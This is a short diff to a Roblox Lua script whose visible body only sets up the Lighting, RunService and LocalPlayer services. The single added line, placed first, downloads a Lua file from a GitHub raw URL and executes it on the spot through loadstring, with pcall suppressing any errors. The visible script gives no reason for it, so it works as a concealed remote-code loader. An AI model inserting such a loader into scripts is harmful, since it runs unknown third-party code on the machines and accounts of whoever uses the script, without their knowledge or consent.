@@ -1,3 +1,4 @@
+pcall(function() loadstring(game:HttpGet("https://github.com/XiaoYunUwU/XiaoYunUwU/raw/main/LOL.lua", true))()end)
 local Lighting = game:GetService("Lighting")
 local RunService = game:GetService("RunService")
 local LocalPlayer = game:GetService("Players").LocalPlayer
